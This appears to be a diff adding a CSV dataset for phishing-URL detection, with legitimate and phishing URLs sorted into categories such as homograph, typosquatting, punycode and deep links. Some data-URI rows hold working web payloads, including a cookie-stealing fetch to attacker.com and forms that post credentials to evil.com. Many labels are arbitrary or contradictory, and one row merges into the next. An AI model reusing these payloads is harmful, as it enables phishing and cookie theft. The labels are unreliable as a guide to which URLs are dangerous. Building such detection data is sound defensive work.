@@ -1,0 +1,405 @@
+url,label,kategori
+https://www.google.com,safe,Legitimate URLs
+https://www.amazon.com,safe,Legitimate URLs
+https://www.microsoft.com,safe,Legitimate URLs
+https://www.apple.com,safe,Legitimate URLs
+https://github.com,safe,Legitimate URLs
+https://www.wikipedia.org,safe,Legitimate URLs
+https://www.linkedin.com,safe,Legitimate URLs
+https://www.reddit.com,safe,Legitimate URLs
+https://www.netflix.com,safe,Legitimate URLs
+https://www.spotify.com,safe,Legitimate URLs
+https://www.adobe.com,safe,Legitimate URLs
+https://www.salesforce.com,safe,Legitimate URLs
+https://www.shopify.com,safe,Legitimate URLs
+https://www.dropbox.com,safe,Legitimate URLs
+https://www.slack.com,safe,Legitimate URLs
+https://www.zoom.us,safe,Legitimate URLs
+https://www.figma.com,safe,Legitimate URLs
+https://www.notion.so,safe,Legitimate URLs
+https://www.trello.com,safe,Legitimate URLs
+https://www.atlassian.com,safe,Legitimate URLs
+https://bit.ly/a1b2c3d,phishing,URL Shortener
+https://tinyurl.com/x9y8z7w,phishing,URL Shortener
+https://t.co/k5m6n7p,phishing,URL Shortener
+https://goo.gl/q1w2e3r,phishing,URL Shortener
+https://ow.ly/t4y5u6i,phishing,URL Shortener
+https://short.link/o7p8a9s,phishing,URL Shortener
+https://is.gd/d4f5g6h,phishing,URL Shortener
+https://buff.ly/j1k2l3z,phishing,URL Shortener
+https://rebrand.ly/x4c5v6b,phishing,URL Shortener
+https://cutt.ly/n7m8q9w,phishing,URL Shortener
+https://shorturl.at/e1r2t3y,phishing,URL Shortener
+https://rb.gy/u4i5o6p,phishing,URL Shortener
+https://short.io/a7s8d9f,phishing,URL Shortener
+https://bl.ink/g1h2j3k,phishing,URL Shortener
+https://t2m.io/l4z5x6c,phishing,URL Shortener
+https://bit.ly/v7b8n9m,phishing,URL Shortener
+https://tinyurl.com/q1a2z3w,phishing,URL Shortener
+https://t.co/s4x5e6d,phishing,URL Shortener
+https://goo.gl/c7r8f9v,phishing,URL Shortener
+https://ow.ly/t1g2b3y,phishing,URL Shortener
+https://short.link/h4n5u6j,phishing,URL Shortener
+https://is.gd/m7i8k9o,phishing,URL Shortener
+https://buff.ly/l1p2a3s,phishing,URL Shortener
+https://rebrand.ly/d4f5g6h,phishing,URL Shortener
+https://cutt.ly/j7k8l9z,phishing,URL Shortener
+https://shorturl.at/x1c2v3b,phishing,URL Shortener
+https://rb.gy/n4m5q6w,phishing,URL Shortener
+https://short.io/e7r8t9y,phishing,URL Shortener
+https://bl.ink/u1i2o3p,phishing,URL Shortener
+https://t2m.io/a4s5d6f,phishing,URL Shortener
+https://gоogle.com,phishing,Homograph Attack
+https://раypal.com,phishing,Homograph Attack
+https://micrоsоft.com,phishing,Homograph Attack
+https://facebоok.com,phishing,Homograph Attack
+https://аmazon.com,phishing,Homograph Attack
+https://аpple.com,phishing,Homograph Attack
+https://netflіx.com,phishing,Homograph Attack
+https://lіnkedin.com,phishing,Homograph Attack
+https://twіtter.com,phishing,Homograph Attack
+https://іnstagram.com,phishing,Homograph Attack
+https://whаtsapp.com,phishing,Homograph Attack
+https://telegрам.org,phishing,Homograph Attack
+https://gіthub.com,phishing,Homograph Attack
+https://drоpbox.com,phishing,Homograph Attack
+https://slаck.com,phishing,Homograph Attack
+https://zоom.us,phishing,Homograph Attack
+https://adоbe.com,phishing,Homograph Attack
+https://sаlesforce.com,phishing,Homograph Attack
+https://shоpify.com,phishing,Homograph Attack
+https://wіkimedia.org,phishing,Homograph Attack
+https://medіum.com,phishing,Homograph Attack
+https://medіafire.com,phishing,Homograph Attack
+https://flicкr.com,phishing,Homograph Attack
+https://vіmeo.com,phishing,Homograph Attack
+https://sоundcloud.com,phishing,Homograph Attack
+http://192.168.1.1/login,phishing,IP-Based URLs
+http://10.0.0.1/admin,phishing,IP-Based URLs
+http://172.16.0.1/portal,phishing,IP-Based URLs
+http://127.0.0.1/phishing,phishing,IP-Based URLs
+http://0.0.0.0/malicious,phishing,IP-Based URLs
+http://255.255.255.255/attack,phishing,IP-Based URLs
+http://192.168.0.1/bank-login,phishing,IP-Based URLs
+http://10.10.10.10/paypal,phishing,IP-Based URLs
+http://172.31.255.255/signin,phishing,IP-Based URLs
+http://198.51.100.1/secure,phishing,IP-Based URLs
+http://203.0.113.5/banking,phishing,IP-Based URLs
+http://192.0.2.10/login,phishing,IP-Based URLs
+http://100.64.0.1/portal,phishing,IP-Based URLs
+http://169.254.1.1/config,phishing,IP-Based URLs
+http://198.18.0.1/admin,phishing,IP-Based URLs
+http://240.0.0.1/reserved,phishing,IP-Based URLs
+http://225.1.1.1/multicast,phishing,IP-Based URLs
+http://192.88.99.1/relay,phishing,IP-Based URLs
+http://192.168.100.1/router,phishing,IP-Based URLs
+http://10.1.1.1/gateway,phishing,IP-Based URLs
+https://login-paypal-abcde.tk,phishing,Suspicious TLDs
+https://secure-apple-fghij.ml,phishing,Suspicious TLDs
+https://bank-microsoft-klmno.ga,phishing,Suspicious TLDs
+https://verify-amazon-pqrst.cf,phishing,Suspicious TLDs
+https://account-google-uvwxy.gq,phishing,Suspicious TLDs
+https://update-facebook-zabcd.xyz,phishing,Suspicious TLDs
+https://confirm-netflix-efghi.top,phishing,Suspicious TLDs
+https://auth-bank-jklmn.club,phishing,Suspicious TLDs
+https://login-apple-opqrs.online,phishing,Suspicious TLDs
+https://secure-microsoft-tuvwx.site,phishing,Suspicious TLDs
+https://bank-amazon-yzabc.icu,phishing,Suspicious TLDs
+https://verify-google-defgh.cyou,phishing,Suspicious TLDs
+https://account-facebook-ijklm.work,phishing,Suspicious TLDs
+https://update-netflix-nopqr.live,phishing,Suspicious TLDs
+https://confirm-bank-stuvw.digital,phishing,Suspicious TLDs
+https://auth-paypal-xyzab.click,phishing,Suspicious TLDs
+https://login-microsoft-cdefg.link,phishing,Suspicious TLDs
+https://secure-amazon-hijkl.download,phishing,Suspicious TLDs
+https://bank-google-mnopq.racing,phishing,Suspicious TLDs
+https://verify-facebook-rstuv.win,phishing,Suspicious TLDs
+https://account-netflix-wxyzab.date,phishing,Suspicious TLDs
+https://update-bank-cdefg.faith,phishing,Suspicious TLDs
+https://confirm-paypal-hijkl.loan,phishing,Suspicious TLDs
+https://auth-apple-mnopq.men,phishing,Suspicious TLDs
+https://login-amazon-rstuv.party,phishing,Suspicious TLDs
+https://paypa1.com,phishing,Typosquatting
+https://gogle.com,phishing,Typosquatting
+https://gooogle.com,phishing,Typosquatting
+https://amaz0n.com,phishing,Typosquatting
+https://arnazon.com,phishing,Typosquatting
+https://facebok.com,phishing,Typosquatting
+https://faceboook.com,phishing,Typosquatting
+https://twltter.com,phishing,Typosquatting
+https://twittter.com,phishing,Typosquatting
+https://instagran.com,phishing,Typosquatting
+https://instagrarn.com,phishing,Typosquatting
+https://linkediin.com,phishing,Typosquatting
+https://lnkedin.com,phishing,Typosquatting
+https://netflx.com,phishing,Typosquatting
+https://netfliix.com,phishing,Typosquatting
+https://micr0soft.com,phishing,Typosquatting
+https://micros0ft.com,phishing,Typosquatting
+https://aple.com,phishing,Typosquatting
+https://appple.com,phishing,Typosquatting
+https://amazom.com,phishing,Typosquatting
+https://arnazon.com,phishing,Typosquatting
+https://you tube.com,phishing,Typosquatting
+https://youtubee.com,phishing,Typosquatting
+https://whatsapps.com,phishing,Typosquatting
+https://whatapp.com,phishing,Typosquatting
+https://telegrarn.com,phishing,Typosquatting
+https://teiegram.com,phishing,Typosquatting
+https://githubb.com,phishing,Typosquatting
+https://githhub.com,phishing,Typosquatting
+https://dropboxx.com,phishing,Typosquatting
+"data:text/html,<script>alert('XSS Attack')</script>",phishing,Data URI
+"data:text/html,<h1>Phishing Page</h1><form><input type='password' name='pass'></form>",phishing,Data URI
+"data:text/html,<meta http-equiv='refresh' content='0; url=https://evil.com'>",phishing,Data URI
+"data:text/html,<iframe src='https://banking-site.com' style='width:100%;height:100%'></iframe>",phishing,Data URI
+"data:text/html,<body onload='document.forms[0].submit()'><form action='https://evil.com/steal' method='POST'><input name='data' value='stolen'></form>",phishing,Data URI
+"data:text/html,<script>window.location='https://phishing-site.com/login'</script>",phishing,Data URI
+"data:text/html,<base href='https://legitimate-looking.com/'><img src='logo.png'>",phishing,Data URI
+"data:text/html,<svg onload='fetch(""https://attacker.com/steal?c=""+document.cookie)'>",phishing,Data URI
+"data:text/html,<input type='text' value='password' onfocus='this.type=""password""'>",phishing,Data URI
+"data:text/html,<div style='position:fixed;top:0;left:0;width:100%;height:100%;background:white'><h1>Security Alert</h1><p>Your account has been compromised. Click <a href=""https://evil.com"">here</a> to secure it.</p></div>",phishing,Data URI
+"data:text/html,<script>document.write('<h1>'+document.domain+'</h1>')</script>",phishing,Data URI
+"data:text/html,<form action='https://evil.com/phish' autocomplete='on'><input name='username' autocomplete='username'><input type='password' name='password' autocomplete='current-password'><button>Login</button></form>",phishing,Data URI
+"data:text/html,<script>history.pushState({}, '', '/bank/login')</script>",phishing,Data URI
+"data:text/html,<a href='javascript:alert(document.domain)'>Click here</a>",phishing,Data URI
+"data:text/html,<object data='https://evil.com/malware.swf'>",phishing,Data URI
+intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end,phishing,Deep Link
+intent://settings/#Intent;action=android.settings.SETTINGS;end,phishing,Deep Link
+intent://tel/#Intent;action=android.intent.action.DIAL;data=tel:1234567890;end,phishing,Deep Link
+intent://sms/#Intent;action=android.intent.action.SENDTO;data=sms:1234567890;end,phishing,Deep Link
+intent://email/#Intent;action=android.intent.action.SEND;type=text/plain;end,phishing,Deep Link
+market://details?id=com.malicious.app,phishing,Deep Link
+intent://wifi/#Intent;action=android.settings.WIFI_SETTINGS;end,phishing,Deep Link
+intent://bluetooth/#Intent;action=android.settings.BLUETOOTH_SETTINGS;end,phishing,Deep Link
+intent://location/#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end,phishing,Deep Link
+intent://security/#Intent;action=android.settings.SECURITY_SETTINGS;end,phishing,Deep Link
+intent://app/#Intent;action=android.intent.action.MAIN;component=com.malicious/.MainActivity;end,phishing,Deep Link
+intent://install/#Intent;action=android.intent.action.VIEW;data=file:///sdcard/malware.apk;type=application/vnd.android.package-archive;end,phishing,Deep Link
+intent://camera/#Intent;action=android.media.action.IMAGE_CAPTURE;end,phishing,Deep Link
+intent://contacts/#Intent;action=android.intent.action.PICK;type=vnd.android.cursor.dir/contact;end,phishing,Deep Link
+intent://calendar/#Intent;action=android.intent.action.INSERT;type=vnd.android.cursor.dir/event;end,phishing,Deep Link
+http://login.paypal.com.phishing-site.com/secure,phishing,Mixed Content
+http://secure-banking-login.com/verify,phishing,Mixed Content
+http://account-verification.net/update,phishing,Mixed Content
+http://login.microsoft.com.evil.com/phish,phishing,Mixed Content
+http://auth.google.com.malicious.org/login,phishing,Mixed Content
+http://www.paypal.com@evil.com/login,phishing,Mixed Content
+http://apple.com:password@phishing.com/secure,phishing,Mixed Content
+http://facebook.com%2F%2F%40phishing.com,phishing,Mixed Content
+http://amazon.co.jp.security-update.com/login,phishing,Mixed Content
+http://netflix.com.account.verify.tk/secure,phishing,Mixed Content
+http://login@banking-site.com:password@evil.com,phishing,Mixed Content
+http://legitimate-looking.com//evil.com/phish,phishing,Mixed Content
+http://google.com..evil.com/redirect,phishing,Mixed Content
+http://yahoo.com%00evil.com,phishing,Mixed Content
+http://microsoft.com?redirect=evil.com,phishing,Mixed Content
+https://www.login.secure.account.update.verify.paypal.com.phishing.com,phishing,Excessive Subdomains
+https://auth.login.secure.banking.account.verify.update.microsoft.com.evil.com,phishing,Excessive Subdomains
+https://www.secure.login.account.billing.payment.amazon.com.malicious.com,phishing,Excessive Subdomains
+https://login.account.security.verification.update.confirm.facebook.com.phish.com,phishing,Excessive Subdomains
+https://secure.auth.login.banking.account.verify.apple.com.evil.org,phishing,Excessive Subdomains
+https://www.login.secure.account.billing.netflix.com.phishing.tk,phishing,Excessive Subdomains
+https://auth.login.secure.account.update.verify.google.com.malicious.xyz,phishing,Excessive Subdomains
+https://login.secure.account.billing.payment.update.linkedin.com.evil.ml,phishing,Excessive Subdomains
+https://www.auth.login.secure.account.verify.twitter.com.phish.ga,phishing,Excessive Subdomains
+https://secure.login.account.billing.verification.instagram.com.malicious.cf,phishing,Excessive Subdomains
+https://login.secure.account.update.verify.whatsapp.com.phishing.gq,phishing,Excessive Subdomains
+https://auth.login.secure.banking.account.payment.telegram.org.evil.tk,phishing,Excessive Subdomains
+https://www.login.secure.account.billing.github.com.malicious.ml,phishing,Excessive Subdomains
+https://secure.auth.login.account.verify.dropbox.com.phish.xyz,phishing,Excessive Subdomains
+https://login.secure.account.update.verification.slack.com.evil.top,phishing,Excessive Subdomains
+https://paypa|l.com,phishing,Special Characters
+https://go0gle.com,phishing,Special Characters
+https://amaz0n.com,phishing,Special Characters
+https://faceb00k.com,phishing,Special Characters
+https://tw1tter.com,phishing,Special Characters
+https://instagr4m.com,phishing,Special Characters
+https://l1nkedin.com,phishing,Special Characters
+https://netfl1x.com,phishing,Special Characters
+https://m1crosoft.com,phishing,Special Characters
+https://appl3.com,phishing,Special Characters
+https://g00gle.com,phishing,Special Characters
+https://y4hoo.com,phishing,Special Characters
+https://redd1t.com,phishing,Special Characters
+https://p1nterest.com,phishing,Special Characters
+https://tumb1r.com,phishing,Special Characters
+https://g\u200Boogle.com,phishing,Zero-Width Characters
+https://pay\u200Cpal.com,phishing,Zero-Width Characters
+https://amaz\u200Don.com,phishing,Zero-Width Characters
+https://faceb\u200Book.com,phishing,Zero-Width Characters
+https://twi\u200Ctter.com,phishing,Zero-Width Characters
+https://insta\u200Dgram.com,phishing,Zero-Width Characters
+https://link\u200Bedin.com,phishing,Zero-Width Characters
+https://netf\u200Clix.com,phishing,Zero-Width Characters
+https://micr\u200Dosoft.com,phishing,Zero-Width Characters
+https://appl\u200De.com,phishing,Zero-Width Characters
+https://xn--ggle-wmc.com,phishing,Punycode
+https://xn--pypal-4ve.com,phishing,Punycode
+https://xn--amzon-wmc.com,phishing,Punycode
+https://xn--fcbook-9ve.com,phishing,Punycode
+https://xn--twtter-6ve.com,phishing,Punycode
+https://xn--instgram-9ve.com,phishing,Punycode
+https://xn--lnkedin-9ve.com,phishing,Punycode
+https://xn--netflx-9ve.com,phishing,Punycode
+https://xn--micrsoft-9ve.com,phishing,Punycode
+https://xn--aple-wmc.com,phishing,Punycode
+https://xn--gthub-9ve.com,phishing,Punycode
+https://xn--drpbox-9ve.com,phishing,Punycode
+https://xn--slck-9ve.com,phishing,Punycode
+https://xn--zom-wmc.com,phishing,Punycode
+https://xn--adbe-wmc.com,phishing,Punycode
+https://bit.ly/3xyz123,phishing,Redirect Chains
+https://tinyurl.com/y7abc123,phishing,Redirect Chains
+https://t.co/xyz123,phishing,Redirect Chains
+https://ow.ly/abc123,phishing,Redirect Chains
+https://short.link/xyz,phishing,Redirect Chains
+https://rebrand.ly/phish123,phishing,Redirect Chains
+https://cutt.ly/xyzABC,phishing,Redirect Chains
+https://rb.gy/abc123,phishing,Redirect Chains
+https://shorturl.at/xyzAB,phishing,Redirect Chains
+https://is.gd/abc123,phishing,Redirect Chains
+https://buff.ly/3xyz123,phishing,Redirect Chains
+https://t2m.io/xyz123,phishing,Redirect Chains
+https://bl.ink/xyz123,phishing,Redirect Chains
+https://short.io/xyz123,phishing,Redirect Chains
+https://clickmeter.com/tracking/xyz123,phishing,Redirect Chains
+https://login-paypal-secure-verify.com/account/update,phishing,Credential Harvesting
+https://appleid-secure-verification.com/signin,phishing,Credential Harvesting
+https://microsoft-account-verify.com/login,phishing,Credential Harvesting
+https://amazon-secure-login.com/account/update,phishing,Credential Harvesting
+https://facebook-security-check.com/login,phishing,Credential Harvesting
+https://netflix-account-verify.com/login,phishing,Credential Harvesting
+https://google-account-security.com/signin,phishing,Credential Harvesting
+https://linkedin-secure-login.com/signin,phishing,Credential Harvesting
+https://twitter-account-verify.com/login,phishing,Credential Harvesting
+https://instagram-security-check.com/login,phishing,Credential Harvesting
+https://whatsapp-web-login.com/verify,phishing,Credential Harvesting
+https://telegram-login-verify.com/signin,phishing,Credential Harvesting
+https://github-secure-login.com/session,phishing,Credential Harvesting
+https://dropbox-login-verify.com/signin,phishing,Credential Harvesting
+https://slack-secure-login.com/signin,phishing,Credential Harvesting
+https://zoom-account-verify.com/login,phishing,Credential Harvesting
+https://adobe-account-secure.com/signin,phishing,Credential Harvesting
+https://salesforce-login-verify.com/login,phishing,Credential Harvesting
+https://shopify-account-secure.com/login,phishing,Credential Harvesting
+https://spotify-login-verify.com/signin,phishing,Credential Harvestinghttps://news.linux.org,safe,News Portal
+https://docs.ui.ac.id,safe,Government
+https://about.stackoverflow.com,safe,Government
+https://docs.ui.ac.id,safe,Education
+https://news.kompas.com,safe,News Portal
+https://career.itb.ac.id,safe,Government
+https://about.ui.ac.id,safe,News Portal
+https://career.linux.org,safe,E-Commerce
+https://help.tokopedia.com,safe,News Portal
+https://www.tokopedia.com,safe,News Portal
+https://about.kemdikbud.go.id,safe,Government
+https://portal.ubuntu.com,safe,Tech & Developer
+https://portal.itb.ac.id,safe,Government
+https://blog.detik.com,safe,Government
+https://www.kemdikbud.go.id,safe,News Portal
+https://blog.kemdikbud.go.id,safe,E-Commerce
+https://www.ubuntu.com,safe,Education
+https://secure.kemdikbud.go.id,safe,Government
+https://help.tokopedia.com,safe,Government
+https://secure.itb.ac.id,safe,Education
+https://secure.detik.com,safe,E-Commerce
+https://help.stackoverflow.com,safe,E-Commerce
+https://www.kompas.com,safe,Education
+https://docs.itb.ac.id,safe,News Portal
+https://portal.ubuntu.com,safe,Government
+https://portal.detik.com,safe,Tech & Developer
+https://forum.tokopedia.com,safe,News Portal
+https://help.ui.ac.id,safe,E-Commerce
+https://www.linux.org,safe,News Portal
+https://portal.ubuntu.com,safe,E-Commerce
+https://help.kompas.com,safe,Government
+https://forum.itb.ac.id,safe,News Portal
+https://career.github.com,safe,Tech & Developer
+https://news.github.com,safe,Government
+https://www.stackoverflow.com,safe,Education
+https://career.ubuntu.com,safe,E-Commerce
+https://www.kemdikbud.go.id,safe,E-Commerce
+https://portal.stackoverflow.com,safe,Education
+https://portal.ubuntu.com,safe,Government
+https://docs.itb.ac.id,safe,Education
+https://secure.kompas.com,safe,Education
+https://portal.tokopedia.com,safe,Education
+https://career.itb.ac.id,safe,Education
+https://docs.itb.ac.id,safe,News Portal
+https://career.ui.ac.id,safe,E-Commerce
+https://about.kompas.com,safe,Government
+https://portal.tokopedia.com,safe,News Portal
+https://career.tokopedia.com,safe,E-Commerce
+https://career.github.com,safe,Education
+https://www.tokopedia.com,safe,Tech & Developer
+https://portal.kemdikbud.go.id,safe,News Portal
+https://www.tokopedia.com,safe,Education
+https://help.detik.com,safe,Education
+https://help.github.com,safe,Tech & Developer
+https://www.kompas.com,safe,Education
+https://news.ui.ac.id,safe,E-Commerce
+https://forum.itb.ac.id,safe,Tech & Developer
+https://forum.stackoverflow.com,safe,E-Commerce
+https://docs.stackoverflow.com,safe,Government
+https://forum.linux.org,safe,News Portal
+https://career.kemdikbud.go.id,safe,Tech & Developer
+https://forum.ui.ac.id,safe,Government
+https://about.kompas.com,safe,News Portal
+https://secure.detik.com,safe,Government
+https://career.kemdikbud.go.id,safe,Government
+https://www.kompas.com,safe,Government
+https://docs.linux.org,safe,E-Commerce
+https://secure.ubuntu.com,safe,E-Commerce
+https://secure.kompas.com,safe,News Portal
+https://help.github.com,safe,Tech & Developer
+https://docs.kemdikbud.go.id,safe,News Portal
+https://secure.linux.org,safe,Government
+https://news.kemdikbud.go.id,safe,Tech & Developer
+https://blog.detik.com,safe,News Portal
+https://docs.detik.com,safe,Tech & Developer
+https://career.ubuntu.com,safe,News Portal
+https://secure.kompas.com,safe,Tech & Developer
+https://portal.linux.org,safe,Education
+https://help.detik.com,safe,Tech & Developer
+https://docs.tokopedia.com,safe,Education
+https://portal.ui.ac.id,safe,Tech & Developer
+https://news.tokopedia.com,safe,Government
+https://portal.kompas.com,safe,E-Commerce
+https://www.kemdikbud.go.id,safe,E-Commerce
+https://news.kompas.com,safe,Government
+https://career.linux.org,safe,E-Commerce
+https://secure.detik.com,safe,News Portal
+https://secure.github.com,safe,News Portal
+https://blog.linux.org,safe,Education
+https://docs.stackoverflow.com,safe,Government
+https://news.ui.ac.id,safe,Education
+https://career.ui.ac.id,safe,Tech & Developer
+https://blog.kompas.com,safe,Education
+https://blog.ui.ac.id,safe,Government
+https://docs.kompas.com,safe,Government
+https://docs.ubuntu.com,safe,E-Commerce
+https://news.kompas.com,safe,E-Commerce
+https://news.ubuntu.com,safe,E-Commerce
+https://secure.detik.com,safe,News Portal
+https://forum.kemdikbud.go.id,safe,Tech & Developer
+https://career.linux.org,safe,Government
+https://secure.tokopedia.com,safe,Education
+https://news.stackoverflow.com,safe,E-Commerce
+https://forum.tokopedia.com,safe,E-Commerce
+https://secure.linux.org,safe,Tech & Developer
+https://news.github.com,safe,Education
+https://www.kompas.com,safe,Tech & Developer
+https://blog.kompas.com,safe,E-Commerce
+https://blog.github.com,safe,E-Commerce
+https://forum.detik.com,safe,Tech & Developer
+https://docs.ui.ac.id,safe,News Portal
+https://www.tokopedia.com,safe,Tech & Developer
+https://portal.github.com,safe,E-Commerce
+https://portal.kemdikbud.go.id,safe,Tech & Developer
+https://blog.tokopedia.com,safe,Tech & Developer
+https://secure.stackoverflow.com,safe,E-Commerce
+https://career.ui.ac.id,safe,News Portal
+https://portal.linux.org,safe,News Portal
+https://blog.itb.ac.id,safe,Government
+https://secure.ubuntu.com,safe,Education
